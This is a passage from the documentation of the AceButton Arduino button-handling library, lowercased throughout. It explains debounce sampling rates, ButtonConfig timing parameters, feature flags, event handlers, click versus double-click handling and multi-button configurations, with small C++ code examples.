getdebouncedelay() so that the various event detection logic can work properly. for example, for the default debounce delay is 20 ms, acebutton::check() should be called every 5 ms. i have successfully experimented with using a sampling delay as large as 10 ms, but i recommend about 5 ms in most cases.\nyou could call the acebutton::check() method directly in the global loop() function like this:\nvoid loop() {\n...\nbutton.check();\n...\n}\nthis would sample the button as fast as possible on your particular microprocessor, perhaps as fast as 10,000 or 100,000 times a second, depending on the other code that is in the loop() function.\nmost of the time, a high sampling rate is not a problem except for 2 things:\ncalling the acebutton::check() has a small overhead and your processor could be doing other things during that time.\nif you use resistor ladder buttons described below, on an esp8266, you will trigger a bug that causes the wifi to disconnect if you sample the analogread() function more than a 1000 times/second.\nif you want to limit the sampling rate, see the example code in rate limit checkbuttons. the code relies on using a static variable to implement a non-blocking delay, like this:\nacebutton button;\n...\nvoid checkbuttons() {\nstatic uint16_t prev = millis();\n// do not use delay(5) to do this.\n// the (uint16_t) cast is required on 32-bit processors, harmless on 8-bit.\nuint16_t now = millis();\nif ((uint16_t) (now - prev) >= 5) {\nbutton.check();\nprev = now;\n}\n}\nvoid loop() {\ncheckbuttons();\n...\n}\ncompiler error on pin 0\nif you attempt to use pin 0 in the acebutton() constructor:\nacebutton button(0);\nyou may encounter a compile-time error such as this:\nerror: call of overloaded 'acebutton(int)' is ambiguous\nthe solution is to explicitly cast the 0 to a uint8_t type, or to assign it explicitly to a uint8_t const, like this:\n// explicit cast\nacebutton button((uint8_t) 0);\n// or assign to a const first.\nstatic const uint8_t pin = 0;\nacebutton button(pin);\nsee issue #40 for details.\nbuttonconfig class\nthe core concept of the acebutton library is the separation of the button (acebutton) from its configuration (buttonconfig).\nthe acebutton class has the logic for debouncing and detecting the various events (pressed, released, etc), and the various bookkeeping variables needed to implement the logic. these variables are associated with the specific instance of that acebutton.\nthe buttonconfig class has the various timing parameters which control how much time is needed to detect certain events. this class also has the ability to override the default methods for reading the pin (readbutton()) and the clock (getclock()). this ability allows unit tests to be written.\nthe class looks like this (not all public methods are shown):\nnamespace ace_button {\nclass buttonconfig {\npublic:\nstatic const uint16_t kdebouncedelay = 20;\nstatic const uint16_t kclickdelay = 200;\nstatic const uint16_t kdoubleclickdelay = 400;\nstatic const uint16_t klongpressdelay = 1000;\nstatic const uint16_t krepeatpressdelay = 1000;\nstatic const uint16_t krepeatpressinterval = 200;\ntypedef uint16_t featureflagtype;\nstatic const featureflagtype kfeatureclick = 0x01;\nstatic const featureflagtype kfeaturedoubleclick = 0x02;\nstatic const featureflagtype kfeaturelongpress = 0x04;\nstatic const featureflagtype kfeaturerepeatpress = 0x08;\nstatic const featureflagtype kfeaturesuppressafterclick = 0x10;\nstatic const featureflagtype kfeaturesuppressafterdoubleclick = 0x20;\nstatic const featureflagtype kfeaturesuppressafterlongpress = 0x40;\nstatic const featureflagtype kfeaturesuppressafterrepeatpress = 0x80;\nstatic const featureflagtype kfeaturesuppressclickbeforedoubleclick = 0x100;\nstatic const featureflagtype kfeaturesuppressall = (\nkfeaturesuppressafterclick\n| kfeaturesuppressafterdoubleclick\n| kfeaturesuppressafterlongpress\n| kfeaturesuppressafterrepeatpress\n| kfeaturesuppressclickbeforedoubleclick);\ntypedef void (*eventhandler)(acebutton* button, uint8_t eventtype,\nuint8_t buttonstate);\nbuttonconfig() = default;\nuint16_t getdebouncedelay();\nuint16_t getclickdelay();\nuint16_t getdoubleclickdelay();\nuint16_t getlongpressdelay();\nuint16_t getrepeatpressdelay();\nuint16_t getrepeatpressinterval();\nvoid setdebouncedelay(uint16_t debouncedelay);\nvoid setclickdelay(uint16_t clickdelay);\nvoid setdoubleclickdelay(uint16_t doubleclickdelay);\nvoid setlongpressdelay(uint16_t longpressdelay);\nvoid setrepeatpressdelay(uint16_t repeatpressdelay);\nvoid setrepeatpressinterval(uint16_t repeatpressinterval);\nvirtual unsigned long getclock();\nvirtual int readbutton(uint8_t pin);\nbool isfeature(featureflagtype features);\nvoid setfeature(featureflagtype features);\nvoid clearfeature(featureflagtype features);\nvoid resetfeatures();\nvoid seteventhandler(eventhandler eventhandler);\nvoid setieventhandler(ieventhandler* eventhandler);\nstatic buttonconfig* getsystembuttonconfig();\n};\n}\nthe buttonconfig (or a customized subclass) can be created and assigned to one or more acebutton instances using dependency injection through the acebutton(buttonconfig*) constructor. this constructor also accepts the same (pin, defaultreleasedstate, id) parameters as init(pin, defaultreleasedstate, id) method. sometimes it's easier to set all the parameters in one place using the constructor. other times, the parameters are not known until the acebutton::init() method can be called from the global setup() method.\nconst uint8_t pin1 = 2;\nconst uint8_t pin2 = 4;\nbuttonconfig buttonconfig;\nacebutton button1(&buttonconfig, pin1);\nacebutton button2(&buttonconfig, pin2);\nvoid setup() {\npinmode(pin1, input_pullup);\npinmode(pin2, input_pullup);\n...\n}\nanother way to inject the buttonconfig dependency is to use the acebutton::setbuttonconfig() method but it is recommended that you use the constructor instead because the dependency is easier to follow.\nsystem buttonconfig\na single instance of buttonconfig called the \"system buttonconfig\" is automatically created by the library at startup. by default, all instances of acebutton are automatically assigned to this singleton instance. we explain in the single button simplifications section below how this simplifies the code needed to handle a single button.\nconfiguring the eventhandler\nthe buttonconfig class provides a number of methods which are mostly used internally by the acebutton class. the one method which is expected to be used by the calling client code is seteventhandler() which assigns the user-defined eventhandler callback function to the buttonconfig instance. this is explained in more detail below in the eventhandler section below.\ntiming parameters\nhere are the methods to retrieve the timing parameters:\nuint16_t getdebouncedelay(); (default: 20 ms)\nuint16_t getclickdelay(); (default: 200 ms)\nuint16_t getdoubleclickdelay(); (default: 400 ms)\nuint16_t getlongpressdelay(); (default: 1000 ms)\nuint16_t getrepeatpressdelay(); (default: 1000 ms)\nuint16_t getrepeatpressinterval(); (default: 200 ms)\nthe default values of each timing parameter can be changed at run-time using the following methods:\nvoid setdebouncedelay(uint16_t debouncedelay);\nvoid setclickdelay(uint16_t clickdelay);\nvoid setdoubleclickdelay(uint16_t doubleclickdelay);\nvoid setlongpressdelay(uint16_t longpressdelay);\nvoid setrepeatpressdelay(uint16_t repeatpressdelay);\nvoid setrepeatpressinterval(uint16_t repeatpressinterval);\nhardware dependencies\nthe buttonconfig class has 2 methods which provide hooks to its external hardware dependencies:\nvirtual unsigned long getclock();\nvirtual int readbutton(uint8_t pin);\nby default these are mapped to the underlying arduino system functions respectively:\nmillis()\ndigitalread()\nunit tests are possible because these methods are virtual and the hardware dependencies can be swapped out with fake ones.\nmultiple buttonconfig instances\nwe have assumed that there is a 1-to-many relationship between a buttonconfig and the acebutton. in other words, multiple buttons will normally be associated with a single configuration. each acebutton has a pointer to an instance of buttonconfig. so the cost of separating the buttonconfig from acebutton is 2 bytes in each instance of acebutton. note that this is equivalent to adding virtual methods to acebutton (which would add 2 bytes), so in terms of static ram size, this is a wash.\nthe library is designed to handle multiple buttons, and it assumes that the buttons are normally grouped together into a handful of types. for example, consider the buttons of a car radio. it has several types of buttons:\nthe tuner buttons (2, up and down)\nthe preset buttons (6)\nthe am/fm band button (1)\nin this example, there are 9 buttons, but only 3 instances of buttonconfig would be needed.\neventhandler typedef\nthe event handler is a callback function that gets called when the acebutton class determines that an interesting event happened on the button. the advantage of this mechanism is that all the complicated logic of determining the various events happens inside the acebutton class, and the user will normally not need to worry about the details.\neventhandler signature\nthe event handler is defined in the buttonconfig class and has the following signature:\nclass buttonconfig {\npublic:\ntypedef void (*eventhandler)(acebutton* button, uint8_t eventtype,\nuint8_t buttonstate);\n...\n};\nthe event handler is registered with the buttonconfig object, not with the acebutton object, although the convenience method acebutton::seteventhandler() is provided as a pass-through to the underlying buttonconfig (see the single button simplifications section below):\nbuttonconfig buttonconfig;\nvoid handleevent(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\n...\n}\nvoid setup() {\n...\nbuttonconfig.seteventhandler(handleevent);\n...\n}\nthe motivation for this design is to save static memory. if multiple buttons are associated with a single buttonconfig, then it is not necessary for every button of that type to hold the same pointer to the eventhandler function. it is only necessary to save that information once, in the buttonconfig object.\npro tip 1: comment out the unused parameter(s) in the handleevent() method to avoid the unused parameter compiler warning:\nvoid handleevent(acebutton* /*button*/, uint8_t eventtype,\nuint8_t /*buttonstate*/) {\n...\n}\nthe arduino sketch compiler can get confused with the parameters commented out, so you may need to add a forward declaration for the handleevent() method before the setup() method:\nvoid handleevent(acebutton*, uint8_t, uint8_t);\npro tips 2: the event handler can be an object instead of just a function pointer. an object-based event handler can be useful in more complex applications with numerous buttons. see the section on object-based event handler in the advanced topics below.\neventhandler parameters\nthe eventhandler function receives 3 parameters from the acebutton:\nbutton\npointer to the acebutton instance that generated this event\ncan be used to retrieve the getpin() or the getid()\neventtype\nthe type of this event given by the various acebutton::keventxxx constants\nbuttonstate\nthe high or low button state that generated this event\nthe button pointer should be used only to extract information about the button that triggered the event. it should not be used to modify the button's internal variables in any way within the eventhandler. the logic in acebutton::check() assumes that those internal variable are held constant, and if they are changed by the eventhandler, unpredictable results may occur. (i should have made the button be a const acebutton* but by the time i realized this, there were too many users of the library already, and i did not want to make a breaking change to the api.)\nif you are using only a single button, then you should need to check only the eventtype.\nit is not expected that buttonstate will be needed very often. it should be sufficient to examine just the eventtype to determine the action that needs to be performed. part of the difficulty with this parameter is that it has the value of low or high, but the physical interpretation of those values depends on whether the button was wired with a pull-up or pull-down resistor. use the helper function button->isreleased(buttonstate) to translate the raw buttonstate into a more meaningful determination if you need it.\none eventhandler per buttonconfig\nonly a single eventhandler per buttonconfig is supported. an alternative would have been to register a separate event handler for each of the 6 keventxxx events. but each callback function requires 2 bytes of memory, and it was assumed that in most cases, the calling client code would be interested in only a few of these event types, so it seemed wasteful to allocate 12 bytes when most of these would be unused. if the client code really wanted separate event handlers, it can be easily emulated by invoking them through the main event handler:\nvoid handleevent(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\nswitch (eventtype) {\ncase acebutton::keventpressed:\nhandleeventpressed(button, eventtype, buttonstate);\nbreak;\ncase acebutton::keventreleased:\nhandleeventreleased(button, eventtype, buttonstate);\nbreak;\n...\n}\n}\neventhandler tips\nthe arduino runtime environment is single-threaded, so the eventhandler is called in the middle of the acebutton::check() method, in the same thread as the check() method. it is therefore important to write the eventhandler code to run somewhat quickly, so that the delay doesn't negatively impact the logic of the acebutton::check() algorithm. since acebutton::check() should run approximately every 5 ms, the user-provided eventhandler should run somewhat faster than 5 ms. given a choice, it is probably better to use the eventhandler to set some flags or variables and return quickly, then do additional processing from the loop() method.\nsometimes it is too convenient or unavoidable to perform a long-running operation inside the event handler (e.g. making an http). this is fine, i have done this occasionally. just be aware that the button scanning operation will not work during that long-running operation.\nspeaking of threads, the api of the acebutton library was designed to work in a multi-threaded environment, if that situation were to occur in the arduino world.\nevent types\nthe supported events are defined by a list of constants in acebutton.h:\nacebutton::keventpressed (always enabled, cannot be suppressed)\nacebutton::keventreleased (default: enabled)\nacebutton::keventclicked (default: disabled)\nacebutton::keventdoubleclicked (default: disabled)\nacebutton::keventlongpressed (default: disabled)\nacebutton::keventrepeatpressed (default: disabled)\nacebutton::keventlongreleased (default: disabled, autoenabled by kfeaturesuppressafterlongpress, new for v1.8)\nthese values are sent to the eventhandler in the eventtype parameter.\ntwo of the events are enabled by default, four are disabled by default but can be enabled by using a feature flag described below.\nbuttonconfig feature flags\nthere are 9 flags defined in buttonconfig which can control the behavior of acebutton event handling:\nbuttonconfig::kfeatureclick\nbuttonconfig::kfeaturedoubleclick\nbuttonconfig::kfeaturelongpress\nbuttonconfig::kfeaturerepeatpress\nbuttonconfig::kfeaturesuppressafterclick\nbuttonconfig::kfeaturesuppressafterdoubleclick\nbuttonconfig::kfeaturesuppressafterlongpress\nbuttonconfig::kfeaturesuppressafterrepeatpress\nbuttonconfig::kfeaturesuppressclickbeforedoubleclick\nbuttonconfig::kfeaturesuppressall\nthese constants are used to set or clear the given flag:\n// get the current config.\nbuttonconfig* config = button.getbuttonconfig();\n// set a specific feature\nconfig->setfeature(buttonconfig::kfeaturelongpress);\n// clear a specific feature\nconfig->clearfeature(buttonconfig::kfeaturelongpress);\n// test for a specific feature\nif (config->isfeature(buttonconfig::kfeaturelongpress)) {\n...\n}\n// clear all features\nconfig->resetfeatures()\nthe meaning of these flags are described below.\nevent activation\nof the 7 event types, 5 are disabled by default:\nacebutton::keventclicked\nacebutton::keventdoubleclicked\nacebutton::keventlongpressed\nacebutton::keventrepeatpressed\nacebutton::keventlongreleased\nto receive these events, call buttonconfig::setfeature() with the following corresponding flags:\nbuttonconfig::kfeatureclick\nbuttonconfig::kfeaturedoubleclick\nbuttonconfig::kfeaturelongpress\nbuttonconfig::kfeaturerepeatpress\nbuttonconfig::kfeaturesuppressafterlongpress (suppresses keventreleased after a longpress, but turns on keventlongreleased as a side effect)\nto disable these events, call buttonconfig::clearfeature() with one of these flags.\nenabling kfeaturedoubleclick automatically enables kfeatureclick, because we need to have a clicked event before a doubleclicked event can be detected.\nit seems unlikely that both longpress and repeatpress events would be useful at the same time, but both event types can be activated if you need it.\nevent suppression\nevent types can be considered to be built up in layers, starting with the lowest level primitive events: pressed and released. higher level events are built on top of the lower level events through various timing delays. when a higher level event is detected, it is sometimes useful to suppress the lower level event that was used to detect the higher level event.\nfor example, a clicked event requires a pressed event followed by a released event within a buttonconfig::getclickdelay() milliseconds (200 ms by default). the pressed event is always generated. if a clicked event is detected, we could choose to generate both a released event and a clicked event, and this is the default behavior.\nhowever, many times, it is useful to suppress the released event if the clicked event is detected. the buttonconfig can be configured to suppress these lower level events. call the setfeature(feature) method passing the various kfeaturesuppressxxx constants:\nbuttonconfig::kfeaturesuppressafterclick\nsuppresses the keventreleased event after a clicked event is detected\nalso suppresses the released event from the first clicked of a doubleclicked, since kfeaturedoubleclick automatically enables kfeatureclick\nbuttonconfig::kfeaturesuppressafterdoubleclick\nsuppresses the keventreleased event and the second clicked event if a doubleclicked event is detected\nbuttonconfig::kfeaturesuppressafterlongpress\nsuppresses the keventreleased event if a longpressed event is detected\n(v1.8) automatically enables keventlongreleased event as a substitute for the suppressed keventreleased, see distinguishing pressed and long pressed subsection below for more details.\nbuttonconfig::kfeaturesuppressafterrepeatpress\nsuppresses the keventreleased event after the last repeatpressed event\nbuttonconfig::kfeaturesuppressclickbeforedoubleclick\nthe first keventclicked event is postponed by getdoubleclickdelay() millis until the code can determine if a doubleclick has occurred. if so, then the postponed keventclicked message to the eventhandler is suppressed.\nsee distinguishing clicked and doubleclicked subsection below for more info.\nbuttonconfig::kfeaturesuppressall\na convenience parameter that is the equivalent of suppressing all of the previous events\nby default, no suppression is performed.\nas an example, to suppress the keventreleased after a keventlongpressed (this is actually often the case), you would do this:\nbuttonconfig* config = button.getbuttonconfig();\nconfig->setfeature(buttonconfig::kfeaturesuppressafterlongpress);\nthe special convenient constant kfeaturesuppressall is equivalent of using all suppression constants:\nbuttonconfig* config = button.getbuttonconfig();\nconfig->setfeature(buttonconfig::kfeaturesuppressall);\nall suppressions can be cleared by using:\nbuttonconfig* config = button.getbuttonconfig();\nconfig->clearfeature(buttonconfig::kfeaturesuppressall);\nnote, however, that the isfeature(buttonconfig::kfeaturesuppressall) currently means \"isanyfeature() implemented?\" not \"areallfeatures() implemented?\" we don't expect isfeature() to be used often (or at all) for kfeaturesuppressall.\nyou can clear all feature at once using:\nbuttonconfig* config = button.getbuttonconfig();\nconfig->resetfeatures();\nthis is useful if you want to reuse a buttonconfig instance and you want to reset its feature flags to its initial state.\nsingle button simplifications\nalthough the acebutton library is designed to shine for multiple buttons, you may want to use it to handle just one button. the library provides some features to make this simple case easy.\nthe library automatically creates one instance of buttonconfig called a \"system buttonconfig\". this system buttonconfig can be retrieved using the class static method buttonconfig::getsystembuttonconfig().\nevery instance of acebutton is assigned an instance of the system buttonconfig by default (which can be overridden manually).\na convenience method allows the eventhandler for the system buttonconfig to be set easily through acebutton itself, instead of having to get the system buttonconfig first, then set the event handler. in other words, button.seteventhandler(handleevent) is a synonym for button.getbuttonconfig()->seteventhandler(handleevent).\nthese simplifying features allow a single button to be configured and used like this:\nacebutton button(button_pin);\nvoid setup() {\npinmode(button_pin, input_pullup);\nbutton.seteventhandler(handleevent);\n...\n}\nvoid loop() {\nbutton.check();\n}\nvoid handleevent(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\n...\n}\nto configure the system buttonconfig, you may need to add something like this to the setup() section:\nbutton.getbuttonconfig()->setfeature(buttonconfig::kfeaturelongpress);\nmultiple buttons\nwhen transitioning from a single button to multiple buttons, it's important to remember what's happening underneath the convenience methods. the single acebutton button is assigned to the system buttonconfig that was created automatically. when an eventhandler is assigned to the button, it is actually assigned to the system buttonconfig. all subsequent instances of acebutton will also be associated with this event handler, unless another buttonconfig is explicitly assigned.\nthere are at least 2 ways you can configure multiple buttons.\noption 1: multiple buttonconfigs\n#include <acebutton.h>\nusing namespace ace_button;\nbuttonconfig config1;\nacebutton button1(&config1);\nbuttonconfig config2;\nacebutton button2(&config2);\nvoid button1handler(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\nserial.println(\"button1\");\n}\nvoid button2handler(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\nserial.println(\"button2\");\n}\nvoid setup() {\nserial.begin(115200);\npinmode(6, input_pullup);\npinmode(7, input_pullup);\nconfig1.seteventhandler(button1handler);\nconfig2.seteventhandler(button2handler);\nbutton1.init(6);\nbutton2.init(7);\n}\nvoid loop() {\nbutton1.check();\nbutton2.check();\n}\nsee the example sketch twobuttonsusingtwobuttonconfigs which uses 2 buttonconfig instances to configure 2 acebutton instances.\noption 2: multiple button discriminators\nanother technique keeps the single system buttonconfig and the single eventhandler, but use the acebutton::getpin() to discriminate between the multiple buttons:\n#include <acebutton.h>\nusing namespace ace_button;\nacebutton button1(6);\nacebutton button2(7);\nvoid button1handler(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\nserial.println(\"button1\");\n}\nvoid button2handler(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\nserial.println(\"button2\");\n}\nvoid buttonhandler(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\nswitch (button->getpin()) {\ncase 6:\nbutton1handler(button, eventtype, buttonstate);\nbreak;\ncase 7:\nbutton2handler(button, eventtype, buttonstate);\nbreak;\n}\n}\nvoid setup() {\nserial.begin(115200);\npinmode(6, input_pullup);\npinmode(7, input_pullup);\nbuttonconfig* config = buttonconfig::getsystembuttonconfig();\nconfig->seteventhandler(buttonhandler);\n}\nvoid loop() {\nbutton1.check();\nbutton2.check();\n}\nsee the example code twobuttonsusingonebuttonconfig. which uses a single buttonconfig instance to handle 2 acebutton instances.\nsometimes, it is more convenient to use the acebutton::getid() method to identify the button instead of the acebutton::getpin(). see arraybuttons for an example.\nadvanced topics\nobject-based event handler\nthe eventhandler is a typedef that is defined to be a function pointer. this is a simple, low-overhead design that produces the smallest memory footprint, and allows the event handler to be written with the smallest amount of boilerplate code. the user does not have to override a class.\nin more complex applications involving larger number of acebutton and buttonconfig objects, it is often useful for the eventhandler to be an object instead of a simple function pointer. this is especially true if the application uses object oriented programming (oop) techniques for modularity and encapsulation. using an object as the event handler allows additional context information to be injected into the event handler.\nto support oop techniques, acebutton v1.6 adds:\nieventhandler interface class\ncontains a single pure virtual function handleevent()\nbuttonconfig::setieventhandler() method\naccepts a pointer to an instance of the ieventhandler interface.\nthe ieventhandler interface is simply this:\nclass ieventhandler {\npublic:\nvirtual void handleevent(acebutton* button, uint8_t eventtype,\nuint8_t buttonstate) = 0;\n};\nat least one of buttonconfig::seteventhandler() or buttonconfig::setieventhandler() must be called before events are actually dispatched. if both are called, the last one takes precedence.\nsee examples/singlebuttonusingieventhandler for an example.\ndistinguishing clicked and doubleclicked\non a project using only a small number of buttons (due to physical limits or the limited availability of pins), it may be desirable to distinguish between a single clicked event and a doubleclicked event from a single button. this is a challenging problem to solve because fundamentally, a doubleclicked event must always generate a clicked event, because a clicked event must happen before it can become a doubleclicked event.\nnotice that on a desktop computer (running windows, macos or linux), a double-click on a mouse always generates both a clicked and a doubleclicked. the first click selects the given desktop object (e.g. an icon or a window), and the doubleclick performs some action on the selected object (e.g. open the icon, or resize the window).\nthe acebutton library provides 3 solutions which may work for some projects:\nmethod 1: the kfeaturesuppressclickbeforedoubleclick flag causes the first clicked event to be detected, but the posting of the event message (i.e. the call to the eventhandler) is postponed until the state of the doubleclicked can be determined. if the doubleclicked happens, then the first clicked event message is suppressed. if doubleclicked does not occur, the long delayed clicked message is sent via the eventhandler.\nthere are two noticeable disadvantages of this method. first, the response time of all clicked events is delayed by about 600 ms (kclickdelay + kdoubleclickdelay) whether or not the doubleclicked event happens. second, the user may not be able to accurately produce a clicked event (due to the physical characteristics of the button, or the user's dexterity).\nit may also be worth noting that only the clicked event is postponed. the accompanying released event of the clicked event is not postponed. so a single click action (without a doubleclick) produces the following sequence of events to the eventhandler:\nkeventpressed - at time 0ms\nkeventreleased - at time 200ms\nkeventclicked - at time 600ms (200ms + 400ms)\nthe buttonconfig configuration looks like this:\nbuttonconfig* buttonconfig = button.getbuttonconfig();\nbuttonconfig->setfeature(buttonconfig::kfeaturedoubleclick);\nbuttonconfig->setfeature(\nbuttonconfig::kfeaturesuppressclickbeforedoubleclick);\nsee the example code at examples/clickversusdoubleclickusingsuppression/.\nmethod 2: a viable alternative is to use the released event instead of the clicked event to distinguish it from the doubleclicked. for this method to work, we need to suppress the released event after both clicked and doubleclicked.\nthe advantage of using this method is that there is no response time lag in the handling of the released event. to the user, there is almost no difference between triggering on the released event, versus triggering on the clicked event.\nthe disadvantage of this method is that the clicked event must be be ignored (because of the spurious clicked event generated by the doubleclicked). if the user accidentally presses and releases the button too quickly, it generates a clicked event, which will cause the program to do nothing.\nthe buttonconfig configuration looks like this:\nbuttonconfig* buttonconfig = button.getbuttonconfig();\nbuttonconfig->seteventhandler(handleevent);\nbuttonconfig->setfeature(buttonconfig::kfeaturedoubleclick);\nbuttonconfig->setfeature(buttonconfig::kfeaturesuppressafterclick);\nbuttonconfig->setfeature(buttonconfig::kfeaturesuppressafterdoubleclick);\nsee the example code at examples/clickversusdoubleclickusingreleased/.\nmethod 3: we could actually combine both methods 1 and 2 so that either released or a delayed click is considered to be a \"click\". this may be the best of both worlds.\nthe buttonconfig configuration looks like this:\nbuttonconfig* buttonconfig = button.getbuttonconfig();\nbuttonconfig->seteventhandler(handleevent);\nbuttonconfig->setfeature(buttonconfig::kfeaturedoubleclick);\nbuttonconfig->setfeature(\nbuttonconfig::kfeaturesuppressclickbeforedoubleclick);\nbuttonconfig->setfeature(buttonconfig::kfeaturesuppressafterclick);\nbuttonconfig->setfeature(buttonconfig::kfeaturesuppressafterdoubleclick);\nsee the example code at examples/clickversusdoubleclickusingboth/.\ndistinguishing pressed and longpressed\nsometimes it is useful to capture both a pressed event and a longpressed event from a single button. since every button press always triggers a keventpressed event, the only reasonable way to distinguish between pressed and longpressed is to use the keventreleased as a substitute for the simple pressed event. when we active kfeaturelongpress, we then must activate the kfeaturesuppressafterlongpress feature to suppress the keventreleased event after the keventlongpressed to avoid yet another overlap of events.\nbuttonconfig* config = button.getbuttonconfig();\nconfig->setfeature(buttonconfig::kfeaturelongpress);\nconfig->setfeature(buttonconfig::kfeaturesuppressafterlongpress);\nthis works most of the time, but i encountered an edge case. occasionally we want to capture the released event after the longpressed event, even if keventreleased must be suppressed as described above. to solve this edge case, in v1.8, i added a new event type keventlongreleased which is triggered as a substitute for keventreleased, only if kfeaturesuppressafterlongpress is used to suppress keventreleased.\nsee the example code at examples/pressversuslongpress to see how all these come together.\nevents after reboot\na number of edge cases occur when the microcontroller is rebooted:\nif the button is held down, should the pressed event be triggered?\nif the button is in its natural released state, should the released event happen?\nif the button is pressed down, and buttonconfig is configured to support repeatpress events, should the keventrepeatpressed events be triggered initially?\ni think most users would expect that in all these cases, the answer is no, the microcontroller should not trigger an event until the button undergoes a human-initiated change in state. the acebutton library implements this logic. (it might be useful to make this configurable using a buttonconfig feature flag but that is not implemented.)\non the other hand, it is sometimes useful to perform some special action if a button is pressed while the device is rebooted. to support this use-case, call the acebutton::ispressedraw() in the global setup() method (after the button is configured). it will directly call the digitalread() method associated with the button pin and return true if the button is in the pressed state.\norphaned clicks\nwhen a clicked event is generated, the acebutton class looks for a second clicked event within a certain time delay (default 400 ms) to determine if the second clicked event is actually a doubleclicked event.\nall internal timestamps in acebutton are stored as uint16_t (i.e. an unsigned integer of 16 bits) in millisecond units. a 16-bit unsigned counter rolls over after 65536 iterations. therefore, if the second clicked event happens between (65.636 seconds, 66.036 seconds) after the first clicked event, a naive-logic would erroneously consider the (long-delayed) second click as a double-click.\nthe acebutton contains code that prevents this from happening.\nnote that even if the acebutton class uses an unsigned long type (a 32-bit integer on the arduino), the overflow problem would still occur after 2^32 milliseconds (i.e. 49.7 days). to be strictly correct, the acebutton class would still need logic to take care of orphaned clicked events.\nbinary encoded buttons\ninstead of allocating one pin for each button, we can use binary encoding to support large number of buttons with only a few pins. the circuit can be implemented using a 74ls148 chip, or simple diodes like this:\nthree subclasses of buttonconfig are provided to handle binary encoded buttons:\nencoded4to2buttonconfig: 3 buttons with 2 pins\nencoded8to3buttonconfig: 7 buttons with 3 pins\nencodedbuttonconfig: m=2^n-1 buttons with n pins\nsee docs/binary_encoding/readme.md for information on how to use these classes.\nresistor ladder buttons\nit is possible to attach 1-8 (maybe more) buttons on a single analog pin through a resistor ladder, and use the analogread() to read the different voltages generated by each button. an example circuit looks like this:\nthe ladderbuttonconfig class handles this configuration.\nsee docs/resistor_ladder/readme.md for information on how to use this class.\ndynamic allocation on the heap\nall classes in this library were originally designed to be created statically at startup time and never deleted during the lifetime of the application. since they were never meant to be deleted through the pointer, i did not include the virtual destructor for polymorphic classes (i.e. buttonconfig and its subclasses). the acebutton class is not polymorphic and does not need a virtual destructor.\nmost 8-bit processors have limited flash and static memory (for example, 32 kb flash and 2 kb static for the nano or uno). adding a virtual destructor causes 600 additional bytes of flash memory to be consumed. i suspect this is due to the virtual destructor pulling the malloc() and free() functions which are needed to implement the new and delete operators. for a library that consumes only about 1200 bytes on an 8-bit processor, this increase in flash memory size did not seem acceptable.\nfor 32-bit processors (e.g. esp8266, esp32) which have far more flash memory (e.g. 1 mb) and static memory (e.g. 80 kb), it seems reasonable to allow acebutton and buttonconfig to be created and deleted from the heap. (see issue #46 for the motivation.) testing shows that the virtual destructor adds only about 60-120 bytes of flash memory for these microcontrollers, probably because the malloc() and free() functions are already pulled in by something else. the 60-120 bytes of additional consumption seems trivial compared to the range of ~256 kb to ~4 mb flash memory available on these 32-bit processors.\ntherefore, i added a virtual destructor for the buttonconfig class (v1.5) and enabled it for all architectures other than arduino_arch_avr (v1.6.1). this prevents 8-bit processors with limited memory from suffering the overhead of an extra 600 bytes of flash memory usage.\neven for 32-bit processors, i still recommend avoiding the creation and deletion of objects from the heap, to avoid the risk of heap fragmentation. if a variable number of buttons is needed, it might be possible to design the application so that all buttons which will ever be needed are predefined in a global pool. even if some of the acebutton and buttonconfig instances are unused, the overhead is probably smaller than the overhead of wasted space due to heap fragmentation.\ndigital write fast\nthe digitalwritefast libraries provide smaller and faster alternative versions the digitalwrite(), digitalread(), and pinmode() functions. i have used 2 such libraries, but there probably others:\nhttps://github.com/nicksonyap/digitalwritefast\na simplified fork of the watterott library\nbut it seems to be unmaintained, e.g. does not support attiny85\nhttps://github.com/watterott/arduino-libs/tree/master/digitalwritefast\nseems to be better maintained, but is not an independent library\nyou must manually git clone the repo and copy or symlink the digitalwritefast/ directory into your arduino ide libraries directory\nthese libraries provide the following functions: digitalwritefast(), digitalreadfast(), and pinmodefast() which are usually valid only avr processors. these alternative functions depend on the pin number and value to be compile-time constants, bypassing the pin number lookup tables used by the standard versions. these fast versions can be 20-50x faster. more importantly in many situations, they can save 100-500 bytes of flash memory by not pulling in the pin number lookup tables.\ni created 3 alternative versions of buttonconfig which use the digitalwritefast libraries:\nsrc/ace_button/fast/buttonconfigfast1.h\nsrc/ace_button/fast/buttonconfigfast2.h\nsrc/ace_button/fast/buttonconfigfast3.h\n(if buttonconfigfast4.h is needed, it is easy to copy buttonconfigfast3.h and create a 4-pin version.)\nthese classes use c++ templates on the pin numbers, so that they can be passed to the digitalreadfast() functions as compile-time constants. because they depend on an external digitalwritefast library, they are not included in the <acebutton.h> header file. they must be included explicitly, as shown below:\n#include <arduino.h>\n#include <acebutton.h>\n#include <digitalwritefast.h>\n#include <ace_button/fast/buttonconfigfast2.h>\nusing namespace ace_button;\n// physical pin numbers attached to the buttons.\nconst uint8_t button1_physical_pin = 2;\nconst uint8_t button2_physical_pin = 3;\n// virtual pin numbers attached to the buttons.\nconst uint8_t button1_pin = 0;\nconst uint8_t button2_pin = 1;\nbuttonconfigfast2<button1_physical_pin, button2_physical_pin> buttonconfig;\nacebutton button1(&buttonconfig, button1_pin);\nacebutton button2(&buttonconfig, button2_pin);\nvoid handleevent(acebutton* button, uint8_t eventtype, uint8_t buttonstate) {\n...\n}\nvoid setup() {\n...\n}\nvoid loop() {\n// should be called every 4-5ms or faster, for the default debouncing time\n// of ~20ms.\nbutton1.check();\nbutton2.check();\n}\neach physical pin number given as template arguments to the buttonconfigfast2<> class corresponds to a virtual pin number (starting with 0) assigned to the acebutton object. within the event handler, everything is referenced by the virtual pin number, just like the encodedbuttonconfig and ladderbuttonconfig classes.\nhere are the example programs for each buttonconfigfast{n} class:\nexamples/singlebuttonfast (buttonconfigfast1)\nexamples/twobuttonsusingonebuttonconfigfast (buttonconfigfast2)\nexamples/threebuttonsusingonebuttonconfigfast (buttonconfigfast3)\nthe ladderbuttonconfig class uses analogread() which does not seem to directly benefit from digitalwritefast libraries. however, if you use pinmodefast() instead of pinmode() in your global setup() function, you can save about 50 bytes of flash (i think).\nthe encoded4to2buttonconfig and 